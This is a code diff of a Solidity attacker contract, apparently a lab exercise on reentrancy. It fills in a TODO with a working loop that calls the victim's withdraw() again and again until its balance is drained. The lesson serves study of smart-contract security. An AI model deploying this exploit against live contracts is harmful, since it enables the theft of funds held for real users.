@@ -14,6 +14,7 @@ interface IVulnerable {
     }
 
     function withdraw() external;
+
     function addUser(string memory _name, uint8 _age, Ethnicity ethnicity) external payable;
 }
 
@@ -28,22 +29,28 @@ contract AttackerContract {
         console.log("** fallback");
     }
 
-     // Receive is a variant of fallback that is triggered when msg.data is empty
+    // Receive is a variant of fallback that is triggered when msg.data is empty
     receive() external payable {
         console.log("attacker balance -> ", Strings.toString(address(this).balance));
         console.log("contract balance -> ", Strings.toString(address(target).balance));
         console.log("-------------------");
         // TODO: call the target/victim smart contract's withdraw method
+        if (address(target).balance >= 1 ether) {
+            console.log("Re-entering victim contract...");
+            target.withdraw();
+        } else {
+            console.log("Victim drained! Stopping exploit loop.");
+        }
     }
 
     // Attack function
     function attack(address _target) external payable {
         require(msg.value >= 1 ether, "Need at least 1 ETH");
 
-        target =  IVulnerable(_target);
+        target = IVulnerable(_target);
 
         // Deposit funds into the target contract
-        target.addUser{value: msg.value}('attacker', 2, IVulnerable.Ethnicity.African);
+        target.addUser{ value: msg.value }("attacker", 2, IVulnerable.Ethnicity.African);
 
         // Trigger the withdrawal function
         target.withdraw();
